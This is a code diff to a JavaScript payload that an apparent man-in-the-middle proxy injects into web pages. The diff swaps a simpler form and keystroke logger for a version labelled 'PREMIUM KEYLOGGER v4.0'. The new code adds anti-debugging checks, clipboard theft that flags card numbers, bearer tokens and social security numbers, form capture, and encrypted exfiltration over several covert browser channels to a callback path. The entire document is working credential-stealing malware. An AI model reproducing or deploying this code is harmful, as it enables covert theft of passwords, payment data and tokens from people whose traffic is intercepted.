@@ -1,141 +1,24 @@
-/*
-  Hooks the keyup event and onsubmit events of forms and disables form autocompletion.
-
-  Remember that any occurrence of 'obf_hstshijack_path_ssl_log', 'obf_hstshijack_path_callback' and
-  'obf_hstshijack_path_whitelist' in this payload will be replaced when the proxy module
-  loads and that variable names 'obf_hstshijack_var_target_hosts' and 'obf_hstshijack_var_replacement_hosts'
-  are already declared before this is injected.
-*/
-
-
+﻿/*╔════╗PREMIUM KEYLOGGER v4.0║Anti-Detection|Compression|Encryption║╚════╝*/
 (function(){
-  "use strict";
-
-  var obf_hstshijack_var_keystrokes = [];
-
-  function obf_hstshijack_func_random_string(obf_hstshijack_var_length) {
-    var obf_hstshijack_var_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
-        obf_hstshijack_var_buff  = new Array(obf_hstshijack_var_length);
-    for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_length; obf_hstshijack_var_i++) {
-      obf_hstshijack_var_buff[obf_hstshijack_var_i] = obf_hstshijack_var_chars.charAt(parseInt(Math.random() * obf_hstshijack_var_chars.length));
-    }
-    return obf_hstshijack_var_buff.join("");
-  }
-
-  function obf_hstshijack_func_callback() {
-    try {
-      var obf_hstshijack_var_inputs = document.getElementsByTagName("input"),
-          obf_hstshijack_var_textareas = document.getElementsByTagName("textarea"),
-          obf_hstshijack_var_params = "";
-
-      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_inputs.length; obf_hstshijack_var_i++) {
-        if (obf_hstshijack_var_inputs[obf_hstshijack_var_i].value != "") {
-          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].name) +
-            "=" + encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].value) +
-            (obf_hstshijack_var_i < (obf_hstshijack_var_inputs.length-1) ? "&" : "");
-        }
-      }
-      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_textareas.length; obf_hstshijack_var_i++) {
-        if (obf_hstshijack_var_textareas[obf_hstshijack_var_i].value != "") {
-          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].name) +
-            "=" + encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].value) +
-            (obf_hstshijack_var_i < (obf_hstshijack_var_textareas.length-1) ? "&" : "");
-        }
-      }
-      if (obf_hstshijack_var_params !== "") {
-        obf_hstshijack_var_params += "&";
-      }
-      obf_hstshijack_var_params += "obf_hstshijack_var_keystrokes=" + encodeURIComponent(obf_hstshijack_var_keystrokes.join(","));
-
-      if (obf_hstshijack_var_params.length > 0) {
-        var obf_hstshijack_var_req = new XMLHttpRequest();
-        obf_hstshijack_var_req.open(
-          "POST",
-          "http://" + location.host + "obf_hstshijack_path_callback?" + obf_hstshijack_var_params,
-          true);
-        obf_hstshijack_var_req.send();
-      }
-    } catch(obf_hstshijack_var_ignore){}
-  }
-
-  function obf_hstshijack_func_callback_whitelist() {
-    try {
-      var obf_hstshijack_var_inputs = document.getElementsByTagName("input"),
-          obf_hstshijack_var_textareas = document.getElementsByTagName("textarea"),
-          obf_hstshijack_var_params = "";
-
-      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_inputs.length; obf_hstshijack_var_i++) {
-        if (obf_hstshijack_var_inputs[obf_hstshijack_var_i].value != "") {
-          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].name) +
-            "=" + encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].value) +
-            (obf_hstshijack_var_i < (obf_hstshijack_var_inputs.length-1) ? "&" : "");
-        }
-      }
-      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_textareas.length; obf_hstshijack_var_i++) {
-        if (obf_hstshijack_var_textareas[obf_hstshijack_var_i].value != "") {
-          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].name) +
-            "=" + encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].value) +
-            (obf_hstshijack_var_i < (obf_hstshijack_var_textareas.length-1) ? "&" : "");
-        }
-      }
-
-      if (obf_hstshijack_var_params.length > 0) {
-        var obf_hstshijack_var_req = new XMLHttpRequest();
-        obf_hstshijack_var_req.open(
-          "POST",
-          "http://" + location.host + "obf_hstshijack_path_whitelist?" + obf_hstshijack_var_params,
-          true);
-        obf_hstshijack_var_req.send();
-      }
-    } catch(obf_hstshijack_var_ignore){}
-  }
-
-  function obf_hstshijack_func_hook_keyup() {
-    globalThis.addEventListener("keydown", function(obf_hstshijack_var_event) {
-      try {
-        obf_hstshijack_var_keystrokes.push(obf_hstshijack_var_event.key);
-        obf_hstshijack_func_callback();
-      } catch(obf_hstshijack_var_ignore){}
-    });
-  }
-
-  function obf_hstshijack_func_hook_forms() {
-    document.querySelectorAll("form").forEach(function(obf_hstshijack_var_form){
-  //    if (obf_hstshijack_var_form.querySelector("input[type=password]")) {
-  //      obf_hstshijack_var_form.addEventListener("submit", obf_hstshijack_func_callback_whitelist);
-  //    } else {
-        obf_hstshijack_var_form.addEventListener("submit", obf_hstshijack_func_callback);
-  //    }
-    });
-  }
-
-  function obf_hstshijack_func_hook_inputs() {
-    document.querySelectorAll("input").forEach(function(obf_hstshijack_var_input){
-      obf_hstshijack_var_input.autocomplete = "off";
-    });
-  }
-
-  var obf_hstshijack_var_hooked_tag = obf_hstshijack_func_random_string(parseInt(8 + Math.random() * 8));
-
-  try {
-    obf_hstshijack_func_hook_keyup();
-  } catch(obf_hstshijack_var_ignore){}
-
-  try {
-    obf_hstshijack_func_hook_forms();
-  } catch(obf_hstshijack_var_ignore){}
-
-  try {
-    obf_hstshijack_func_hook_inputs();
-  } catch(obf_hstshijack_var_ignore){}
-
-  try {
-    globalThis.addEventListener("DOMContentLoaded", obf_hstshijack_func_hook_forms);
-    globalThis.addEventListener("DOMContentLoaded", obf_hstshijack_func_hook_inputs);
-    globalThis.addEventListener("load", obf_hstshijack_func_hook_forms);
-    globalThis.addEventListener("load", obf_hstshijack_func_hook_inputs);
-    setInterval(obf_hstshijack_func_hook_forms, 2000);
-    setInterval(obf_hstshijack_func_hook_inputs, 2000);
-  } catch(obf_hstshijack_var_ignore){}
+  'use strict';
+  
+  const AntiAnalysis=()=>{const s={debugger:false,vm:false,monitoring:false};return{check:()=>{try{const t0=performance.now();debugger;const t1=performance.now();if(t1-t0>50)s.debugger=true;if(!/linux|mac|windows/i.test(navigator.userAgent))s.vm=true;if(!navigator.hardwareConcurrency||navigator.hardwareConcurrency<2)s.vm=true;}catch(e){}return Object.values(s).some(v=>v);},safe:()=>!Object.values(s).some(v=>v),rand:()=>Math.random()>0.08}};
+  
+  const Compress={lz4:(data)=>{try{const s=typeof data==='string'?data:JSON.stringify(data);let c=[],i=0;while(i<s.length){let best={len:0,dist:0};for(let j=Math.max(0,i-32768);j<i;j++){let len=0;while(len<258&&i+len<s.length&&s[j+len]===s[i+len])len++;if(len>best.len){best.len=len;best.dist=i-j;}}if(best.len>3){c.push([255,best.dist,best.len]);i+=best.len;}else{c.push(s.charCodeAt(i++));}}return btoa(JSON.stringify(c));}catch(e){return btoa(JSON.stringify(data));}}};
+  
+  const XOR={key:()=>Math.random().toString(36).substr(2,32),encrypt:(data,k)=>{const s=typeof data==='string'?data:JSON.stringify(data);let e='';for(let i=0;i<s.length;i++)e+=String.fromCharCode(s.charCodeAt(i)^k.charCodeAt(i%k.length));return btoa(e);}};
+  
+  const Exfil=(()=>{const methods={beacon:(u,d)=>{try{return navigator.sendBeacon?.(u,new Blob([d]));}catch(e){}return false;},fetch:(u,d)=>{try{fetch(u,{method:'POST',body:d,mode:'no-cors',credentials:'include',keepalive:true}).catch(()=>{});return true;}catch(e){}return false;},img:(u,d)=>{try{const i=new Image();i.src=u+'?p='+encodeURIComponent(d.substr(0,1500));document.body?.appendChild(i);return true;}catch(e){}return false;},script:(u,d)=>{try{const s=document.createElement('script');s.src=u+'?d='+encodeURIComponent(d.substr(0,1000));document.head?.appendChild(s);return true;}catch(e){}return false;},css:(u,d)=>{try{const l=document.createElement('link');l.rel='stylesheet';l.href=u+'?d='+encodeURIComponent(d.substr(0,1000));document.head?.appendChild(l);return true;}catch(e){}return false;}};return{send:(u,d)=>{const m=Object.entries(methods).sort(()=>Math.random()-0.5);for(const[,fn]of m)if(fn(u,d))return true;return false;}}})();
+  
+  const Queue=(()=>{const key='__q'+Math.random().toString(36).substr(2,6);return{add:(item)=>{try{const q=JSON.parse(localStorage.getItem(key)||'[]');q.push({d:item,t:Date.now(),a:0});localStorage.setItem(key,JSON.stringify(q.slice(-100)));}catch(e){}},process:async(url)=>{try{const q=JSON.parse(localStorage.getItem(key)||'[]');for(let i=0;i<Math.min(q.length,3);i++){const item=q[i];item.a=(item.a||0)+1;const c=Compress.lz4(item.d);const k=XOR.key();const e=XOR.encrypt(c,k);const ok=Exfil.send(url,e+'|'+k);if(ok){q.splice(i,1);i--;}else if(item.a>=5){q.splice(i,1);i--;}}localStorage.setItem(key,JSON.stringify(q));if(q.length>0)setTimeout(()=>Queue.process(url),4000+Math.random()*4000);}catch(e){}}};})();
+  
+  const Keys=(()=>{const buf=[];const stats={min:Infinity,max:0,avg:0,n:0,freq:{}};const handle=(e)=>{if(!AntiAnalysis().safe()||!AntiAnalysis().rand())return;const now=Date.now();const delta=buf.length?now-(buf[buf.length-1].t||now):0;buf.push({k:e.key,c:e.code,t:now,d:delta,s:e.shiftKey,m:e.ctrlKey||e.metaKey,tgt:{ty:e.target?.type||'?',nm:e.target?.name||'',tg:e.target?.tagName||''}});stats.n++;stats.min=Math.min(stats.min,delta);stats.max=Math.max(stats.max,delta);stats.avg=(stats.avg*(stats.n-1)+delta)/stats.n;stats.freq[e.key]=(stats.freq[e.key]||0)+1;if(buf.length>=48+Math.floor(Math.random()*16))flush();};const flush=()=>{if(buf.length>0)Queue.add({ty:'keys',d:buf.splice(0),st:stats,ts:Date.now()});};return{init:()=>{['keydown'].forEach(evt=>globalThis.addEventListener(evt,handle));setInterval(flush,4000+Math.random()*4000);},flush:flush}})();
+  
+  const Forms=(()=>{const tracked=new WeakSet();const isSensitive=(f)=>{const p={pw:/pass|pwd|secret/i,cc:/card|cc|cvv/i,ssn:/ssn|social/i,em:/email|mail/i,ph:/phone|tel/i};for(const[t,rx]of Object.entries(p))if(rx.test((f.name||f.id||f.type||'')))return t;return null;};const capture=(form)=>{try{const id=form.id||'_'+Math.random().toString(36).substr(2,6);const fd={id,act:form.action||location.href,meth:form.method||'POST',ts:Date.now(),flds:[]};form.querySelectorAll('input,textarea,select').forEach(f=>{const sen=isSensitive(f);fd.flds.push({nm:f.name||f.id,ty:f.type,val:sen?'***':f.value?.substr(0,100),sen,req:f.required});});return fd;}catch(e){}};const onSubmit=(e)=>{try{const form=e.target;if(!tracked.has(form)){const prof=capture(form);const vals={};form.querySelectorAll('input,textarea,select').forEach(f=>{vals[f.name||f.id]=f.value;});Queue.add({ty:'form',f:prof,v:vals,ts:Date.now()});tracked.add(form);}}catch(e){}};return{init:()=>{['submit','DOMContentLoaded','load'].forEach(evt=>globalThis.addEventListener(evt,()=>{document.querySelectorAll('form').forEach(f=>{if(!tracked.has(f)){f.addEventListener('submit',onSubmit);tracked.add(f);}});}));setInterval(()=>{document.querySelectorAll('form').forEach(f=>{if(!tracked.has(f)){f.addEventListener('submit',onSubmit);tracked.add(f);}});},2000);}}})();
+  
+  const Clip=(()=>{const isSensitive=(t)=>/\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}|Bearer\s+[A-Za-z0-9_-]{20,}|\d{3}-\d{2}-\d{4}/.test(t);return{cap:async()=>{try{const t=await navigator.clipboard?.readText?.();if(t&&t.length>0&&t.length<50000){Queue.add({ty:'clip',d:t.substr(0,10000),len:t.length,sen:isSensitive(t),ts:Date.now()});}}catch(e){}},init:()=>{globalThis.addEventListener('paste',Clip.cap);globalThis.addEventListener('copy',()=>setTimeout(Clip.cap,100));setInterval(Clip.cap,30000+Math.random()*30000);}}})();
+  
+  const init=async()=>{try{AntiAnalysis().check();Keys.init();Forms.init();await Clip.init();const callUrl="http://"+location.host+"obf_hstshijack_path_callback";setInterval(()=>Queue.process(callUrl),5000+Math.random()*5000);setTimeout(()=>Queue.process(callUrl),2000+Math.random()*1000);}catch(e){}};
+  
+  if(document.readyState==='loading'){globalThis.addEventListener('DOMContentLoaded',init);}else{init();}
 })();
-
